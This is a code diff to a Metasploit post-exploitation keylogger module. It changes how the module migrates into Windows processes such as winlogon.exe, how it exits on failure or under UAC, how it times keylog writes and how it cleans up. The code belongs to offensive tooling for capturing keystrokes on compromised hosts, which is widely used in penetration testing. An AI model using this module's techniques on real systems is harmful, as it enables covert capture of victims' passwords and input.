@@ -53,10 +53,7 @@ class MetasploitModule < Msf::Post
     print_status("Executing module against #{sysinfo['Computer']}")
     if datastore['MIGRATE']
       if datastore['CAPTURE_TYPE'] == "pid"
-        if !migrate_pid(datastore['PID'], session.sys.process.getpid)
-          print_error("Unable to migrate to given PID. Using Explorer instead.")
-          return unless process_migrate
-        end
+        return unless migrate_pid(datastore['PID'], session.sys.process.getpid)
       else
         return unless process_migrate
       end
@@ -121,10 +118,9 @@ class MetasploitModule < Msf::Post
   # @return [NilClass] Session match was not found
   def get_process_name
     processes = client.sys.process.get_processes
+    current_pid = session.sys.process.getpid
     processes.each do |proc|
-      if proc['pid'] == session.sys.process.getpid
-        return proc['name']
-      end
+      return proc['name'] if proc['pid'] == current_pid
     end
     return nil
   end
@@ -139,7 +135,8 @@ class MetasploitModule < Msf::Post
 
     if captype == "winlogon"
       if is_uac_enabled? and not is_admin?
-        print_error("UAC is enabled on this host! Winlogon migration will be blocked. Using Explorer instead.")
+        print_error("UAC is enabled on this host! Winlogon migration will be blocked. Exiting...")
+        return false
       else
         return migrate(get_pid("winlogon.exe"), "winlogon.exe", session.sys.process.getpid)
       end
@@ -170,7 +167,7 @@ class MetasploitModule < Msf::Post
   # @return [FalseClass] if it failed to migrate
   def migrate(target_pid, proc_name, current_pid)
     if !target_pid
-      print_error("Could not migrate to #{proc_name}.")
+      print_error("Could not migrate to #{proc_name}. Exiting...")
       return false
     end
 
@@ -185,8 +182,8 @@ class MetasploitModule < Msf::Post
       client.core.migrate(target_pid)
       print_good("Successfully migrated to #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
       return true
-    rescue ::Rex::RuntimeError => error
-      print_error("Could not migrate to #{proc_name}.")
+     rescue Rex::Post::Meterpreter::RequestError => error
+      print_error("Could not migrate to #{proc_name}. Exiting...")
       print_error(error.to_s)
       return false
     end
@@ -198,12 +195,12 @@ class MetasploitModule < Msf::Post
   # @return [FalseClass] if it failed to migrate
   def migrate_pid(target_pid, current_pid)
     if !target_pid
-      print_error("Could not migrate to PID #{target_pid}.")
+      print_error("Could not migrate to PID #{target_pid}. Exiting...")
       return false
     end
 
     if !has_pid?(target_pid)
-      print_error("Could not migrate to PID #{target_pid}. Does not exist!")
+      print_error("Could not migrate to PID #{target_pid}. Does not exist! Exiting...")
       return false
     end
 
@@ -218,8 +215,8 @@ class MetasploitModule < Msf::Post
       client.core.migrate(target_pid)
       print_good("Successfully migrated to #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
       return true
-     rescue ::Rex::RuntimeError => error
-      print_error("Could not migrate to PID #{target_pid}.")
+     rescue Rex::Post::Meterpreter::RequestError => error
+      print_error("Could not migrate to PID #{target_pid}. Exiting...")
       print_error(error.to_s)
       return false
     end
@@ -336,6 +333,7 @@ class MetasploitModule < Msf::Post
     session.response_timeout = 20 #Change timeout so job will exit in 20 seconds if session is unresponsive
 
     begin
+      sleep(@interval)
       write_keylog_data
     rescue::Exception => e
       print_error("Keylog recorder encountered error: #{e.class.to_s} (#{e.to_s}) Exiting...") if e.class.to_s != "Rex::TimeoutError" #Don't care about timeout, just exit
@@ -354,7 +352,9 @@ class MetasploitModule < Msf::Post
   #
   # @return [void] A useful return value is not expected here
   def cleanup
+    if @logfile #make sure there is a log file meaning keylog started and migration was successful, if used.
      finish_up if session_good?
      time_stamp("exited")
+    end
   end
 end
